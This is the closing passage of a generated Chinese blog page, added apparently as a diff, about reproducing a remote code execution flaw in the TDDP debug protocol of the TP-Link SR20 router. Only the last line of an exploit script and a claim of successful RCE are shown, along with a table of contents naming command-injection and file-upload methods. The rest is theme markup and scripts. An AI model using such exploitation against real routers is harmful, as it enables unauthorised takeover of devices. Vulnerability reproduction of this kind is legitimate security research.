class="line">s_send.close()</span><br></pre></td></tr></table></figure>
+
+<p>可以看到我们成功<code>RCE</code></p>
+<p><img src="/images/TP-LinkSR20RCE%E6%BC%8F%E6%B4%9E/1751957298111.png" alt="1751957298111"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/iot%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">iot漏洞复现</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/covers/er.jpg" data-sizes="auto" alt="CVE-2018-7034" class="lazyload">
+        
+      
+      <a href="/2025/07/07/CVE-2018-7034%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          CVE-2018-7034
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+
+
+
+
+</section>
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      
+      
+      
+        2020-2025
+      
+      <span class="footer-info-sep rotate"></span>
+      zer00ne
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        32.9k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        02:22
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#TP-Link-SR20-RCE%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">TP-Link SR20 RCE漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">| 0 | 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%9B%BA%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E8%A7%A3%E5%8C%85-qemu%E9%85%8D%E7%BD%AE"><span class="toc-number">1.2.</span> <span class="toc-text">| 1 | 固件下载&amp;解包&amp;qemu配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80"><span class="toc-number">1.2.1.</span> <span class="toc-text">下载地址 :</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%8C%85"><span class="toc-number">1.2.2.</span> <span class="toc-text">解包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#qemu%E9%85%8D%E7%BD%AE"><span class="toc-number">1.2.3.</span> <span class="toc-text">qemu配置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E9%80%86%E5%90%91"><span class="toc-number">1.3.</span> <span class="toc-text">| 2 | 二进制文件逆向</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95"><span class="toc-number">1.4.</span> <span class="toc-text">| 3 | 利用手法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%9B%B4%E6%8E%A5%E6%B3%A8%E5%85%A5execve"><span class="toc-number">1.4.1.</span> <span class="toc-text">1.直接注入execve()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.4.2.</span> <span class="toc-text">2.文件上传</span></a></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="zer00ne" class="lazyload">
+  <div class="sidebar-author-name">zer00ne</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">14</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">6</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+    
+  </div>
+  
+    
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  
+</nav>
+
+    </div>
+    
+    
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+  <script>
+    function initLive2d() {
+      live2d.init("https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/", {themeTipsPath: ""});
+    }
+  </script>
+  
+<script src="https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/js/live2d-autoload.js" onload="initLive2d &amp;&amp; initLive2d()" async></script>
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "zer00ne",
+          title: "TP-Link SR20 RCE漏洞",
+          url: "https://khighl.github.io.git/2025/07/08/TP-Link%20SR20%20RCE%E6%BC%8F%E6%B4%9E/",
+          excerpt: "",
+          description: "",
+          stripContent: "TP-Link SR20 RCE漏洞| 0 | 前言TDDP协议(TP-LINK Device Debug Protocol) 是TP-LINK申请了专利的一种在UPD通信的基础上设计的协议,而Google著名安全专家Matthew Garrett在TP-Link SR20设备上的TDDP协议文件中发现了一处可造成 “允许来自本地网络连接的任意命令执行”(RCE) 的漏洞. UPD通信协议的设计目的：轻便、快速、不建立连接(不像TCP那样要三次握手) | 1 | 固件下载&amp;amp;解包&amp;amp;",
+          date: "Tue Jul 08 2025 00:00:00 GMT+0800",
+          updated: "Tue Jul 08 2025 14:48:30 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+        
+
+
+
+
+
+
+
+
+      
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.8.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+
+    
+  </body>
+  </html>
+
